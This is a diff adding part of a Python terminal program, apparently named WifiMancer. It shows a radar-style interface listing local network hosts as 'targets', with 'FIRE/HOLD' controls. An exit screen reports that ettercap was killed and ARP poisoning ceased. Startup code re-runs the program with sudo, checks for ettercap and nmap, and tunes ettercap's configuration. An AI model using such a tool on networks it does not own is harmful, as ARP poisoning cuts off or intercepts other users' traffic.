+            brg = f" BRG {int(sweep_angle):03d}°  ·  {scan_state} "
+            safe_addstr(stdscr, main_top + main_h - 1, 2, brg,
+                        curses.color_pair(1) | curses.A_REVERSE | curses.A_BOLD)
+
+            # ─── TARGET DESIGNATOR LIST (right) ───────────────
+            lx = radar_w
+            for y in range(main_top, main_top + main_h):
+                safe_addstr(stdscr, y, lx, "│", curses.color_pair(2))
+
+            tg_title = f" ◢ TARGET DESIGNATION  ·  {len(rows)} CONTACTS ◣ "
+            safe_addstr(stdscr, main_top, lx + 2, tg_title,
+                        curses.color_pair(1) | curses.A_BOLD)
+            safe_addstr(stdscr, main_top + 1, lx + 2,
+                        " " + "─" * (list_w - 6) + " ",
+                        curses.color_pair(2))
+
+            list_visible = max(1, main_h - 3)
+            if cursor < scroll:
+                scroll = cursor
+            if cursor >= scroll + list_visible:
+                scroll = cursor - list_visible + 1
+            scroll = max(0, min(scroll, max(0, len(rows) - list_visible)))
+
+            cls_for = lambda ip, mac, age, idle: (
+                ("SLF", "◉", 5) if ip == ctx["self_ip"] else
+                ("GTW", "⌂", 5) if ip == ctx["gw"] else
+                ("FRD", "♡", 9) if mac in allow else
+                ("NEW", "⚡", 4) if age < 6 else
+                ("HST", "☠", 1) if idle < 30 else
+                ("FAD", "~", 2) if idle < 120 else
+                ("OFF", "·", 6))
+
+            for i in range(list_visible):
+                idx = scroll + i
+                if idx >= len(rows):
+                    break
+                ip, info = rows[idx]
+                idle = int(now - info["last"])
+                age = int(now - info["first"])
+                mac = info["mac"]
+                cls, sym, c = cls_for(ip, mac, age, idle)
+
+                desig = f"T-{idx + 1:03d}"
+                vendor = (info["vendor"][:12] if info["vendor"] else "?").ljust(12)
+                cur = "[▶]" if idx == cursor else "   "
+                line = (f" {cur} {desig} {sym}{cls} {ip:<14} {vendor}  "
+                        f"E{age:>4}s  R{info['reconnects']:<2}")
+
+                if idx == cursor:
+                    attr = (curses.color_pair(4)
+                            | curses.A_REVERSE | curses.A_BOLD)
+                else:
+                    attr = curses.color_pair(c) | curses.A_BOLD
+
+                safe_addstr(stdscr, main_top + 2 + i, lx + 1,
+                            line[:list_w - 2], attr)
+
+            # scroll bar
+            if len(rows) > list_visible and list_visible > 1:
+                bar_h = max(1, list_visible * list_visible // max(1, len(rows)))
+                denom2 = max(1, len(rows) - list_visible)
+                bar_top = (scroll * (list_visible - bar_h)) // denom2
+                for i in range(list_visible):
+                    glyph = "█" if bar_top <= i < bar_top + bar_h else "│"
+                    safe_addstr(stdscr, main_top + 2 + i, lx + list_w - 2,
+                                glyph, curses.color_pair(2))
+
+            # ─── TELEMETRY (full-width) ──────────────────────
+            log_top = main_top + main_h
+            safe_addstr(stdscr, log_top, 0, "═" * (w - 1),
+                        curses.color_pair(2))
+            tlm_title = " ◢ TELEMETRY ◣ "
+            safe_addstr(stdscr, log_top, 3, tlm_title,
+                        curses.color_pair(1) | curses.A_BOLD | curses.A_REVERSE)
+            log_entries = list(log)[-(log_h - 1):]
+
+            def classify(msg):
+                m = msg.lstrip()
+                if m.startswith("+"): return "CONTACT  ", 4
+                if m.startswith("~"): return "ANOMALY  ", 4
+                if m.startswith("×"): return "STAND-DN ", 1
+                if m.startswith("♡"): return "MARK-FRD ", 9
+                return "INFO     ", 5
+
+            for i, (ts, msg, color) in enumerate(log_entries):
+                t = time.strftime("T+%H:%M:%S", time.localtime(ts))
+                tag, tag_c = classify(msg)
+                safe_addstr(stdscr, log_top + 1 + i, 1, t,
+                            curses.color_pair(6))
+                safe_addstr(stdscr, log_top + 1 + i, 12, "│",
+                            curses.color_pair(2))
+                safe_addstr(stdscr, log_top + 1 + i, 14, tag,
+                            curses.color_pair(tag_c) | curses.A_BOLD)
+                safe_addstr(stdscr, log_top + 1 + i, 24, "│",
+                            curses.color_pair(2))
+                clean = msg.lstrip("+~×♡· ").strip()
+                safe_addstr(stdscr, log_top + 1 + i, 26, clean[:w - 28],
+                            curses.color_pair(color))
+
+            # ─── COMMAND FOOTER ───────────────────────────────
+            footer = ("  [↑↓] NAV   ·   [SPACE] FIRE/HOLD   ·   "
+                      "[A] PICKER   ·   [R] RESCAN   ·   "
+                      "[Q] DISENGAGE  ")
+            safe_addstr(stdscr, h - 1, 0,
+                        footer.center(w - 1)[:w - 1],
+                        curses.color_pair(1) | curses.A_REVERSE | curses.A_BOLD)
+
+            stdscr.refresh()
+    finally:
+        counter.stop()
+        worker.stop()
+
+
+def exit_animation(stdscr, ctx):
+    init_colors()
+    curses.curs_set(0)
+    stdscr.nodelay(False)
+    stdscr.erase()
+    h, w = stdscr.getmaxyx()
+
+    title = "« dismissing the conjuration »"
+    msgs = [
+        "ettercap killed",
+        "ARP poisoning ceased",
+        "broadcasting truth: gateway is gateway again",
+        "ARP caches healing in ~30s",
+        "WifiMancer dismissed",
+    ]
+    by = max(0, (h - len(msgs) - 6) // 2)
+    bx = max(0, (w - 60) // 2)
+
+    safe_addstr(stdscr, by, max(0, (w - len(title)) // 2),
+                title, curses.color_pair(2) | curses.A_BOLD)
+    stdscr.refresh()
+    time.sleep(0.3)
+
+    for i, m in enumerate(msgs):
+        line = f"  [-] {m}"
+        safe_addstr(stdscr, by + 2 + i, bx, line, curses.color_pair(3))
+        stdscr.refresh()
+        time.sleep(0.16)
+        safe_addstr(stdscr, by + 2 + i, bx + len(line) + 1, "✓",
+                    curses.color_pair(1))
+        stdscr.refresh()
+
+    farewell = "the network breathes again  ·  see you on the other side"
+    safe_addstr(stdscr, by + 2 + len(msgs) + 2,
+                max(0, (w - len(farewell)) // 2),
+                farewell, curses.color_pair(1) | curses.A_BOLD)
+    stdscr.refresh()
+    time.sleep(1.1)
+
+    for fade in range(5):
+        stdscr.erase()
+        for _ in range(max(10, 80 - fade * 18)):
+            y = random.randint(0, max(0, h - 1))
+            x = random.randint(0, max(0, w - 1))
+            safe_addstr(stdscr, y, x, random.choice("·.░▒"),
+                        curses.color_pair(2))
+        stdscr.refresh()
+        time.sleep(0.1)
+    stdscr.erase()
+    stdscr.refresh()
+
+
+def quick_intro(stdscr, ctx):
+    """Sub-second flash: banner + status, then go."""
+    init_colors()
+    curses.curs_set(0)
+    stdscr.erase()
+    h, w = stdscr.getmaxyx()
+    blines = BANNER.splitlines()
+    bw = max(len(l) for l in blines)
+    bx = max(0, (w - bw) // 2)
+    by = max(0, (h - len(blines)) // 2 - 2)
+    for i, line in enumerate(blines):
+        safe_addstr(stdscr, by + i, bx, line[:max(0, w - bx - 1)],
+                    curses.color_pair(1) | curses.A_BOLD)
+    tag = "·  layer-2 necromancer  ·  network radar engaged  ·"
+    safe_addstr(stdscr, by + len(blines) + 1,
+                max(0, (w - len(tag)) // 2),
+                tag, curses.color_pair(2))
+    stdscr.refresh()
+    time.sleep(0.35)
+
+
+def run(stdscr, ctx):
+    quick_intro(stdscr, ctx)
+    ctx["allowlist"] = load_allowlist()
+    tui(stdscr, ctx)
+    exit_animation(stdscr, ctx)
+
+
+def main():
+    if os.geteuid() != 0:
+        os.execvp("sudo", ["sudo", "-E", sys.executable, *sys.argv])
+
+    for path, name in ((ETTERCAP, "ettercap"),
+                       (ETTERFILTER, "etterfilter"),
+                       (NMAP, "nmap"),
+                       (TCPDUMP, "tcpdump")):
+        if not os.path.exists(path):
+            sys.exit(f"missing {name} at {path}.  brew install ettercap nmap")
+
+    ensure_drop_filter()
+    tune_etter_conf()
+    kill_zombie_ettercap()
+
+    iface, self_ip, gw, mac, ssid = detect()
+    if not (iface and self_ip and gw):
+        sys.exit("no active network detected — connect first")
+
+    subnet_net = ipaddress.ip_network(self_ip + "/24", strict=False)
+    ctx = {
+        "iface": iface, "self_ip": self_ip, "gw": gw, "mac": mac,
+        "ssid": ssid, "subnet_net": subnet_net, "subnet": str(subnet_net),
+    }
+
+    curses.wrapper(run, ctx)
+
+
+if __name__ == "__main__":
+    main()
